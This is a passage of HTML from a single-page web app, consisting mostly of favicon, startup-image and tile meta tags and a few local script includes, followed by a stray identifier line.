landscape)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-2436x1125.png"><link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-2208x1242.png"><link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-2688x1242.png"><link rel="apple-touch-startup-image" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-2048x1536.png"><link rel="apple-touch-startup-image" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-2224x1668.png"><link rel="apple-touch-startup-image" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-2388x1668.png"><link rel="apple-touch-startup-image" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-2732x2048.png"><link rel="apple-touch-startup-image" media="(device-width: 810px) and (device-height: 1080px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-2160x1620.png"><link rel="icon" type="image/png" sizes="228x228" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/coast-228x228.png"><meta name="msapplication-TileColor" content="#fff"><meta name="msapplication-TileImage" content="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/mstile-144x144.png"><meta name="msapplication-config" content="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/browserconfig.xml"><link rel="yandex-tableau-widget" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/yandex-browser-manifest.json"></head><body><div id="app"></div><script src="/manifest.1618601423504.js"></script><script src="/vendor.4f517fe216.js"></script><script src="/frontend.f58b54b999.js"></script><script src="/app.37ef2c3c90.js"></script></body></html># 1A2RzhkurTTCxTK2GNyXAFRAgwa4zqpURr-
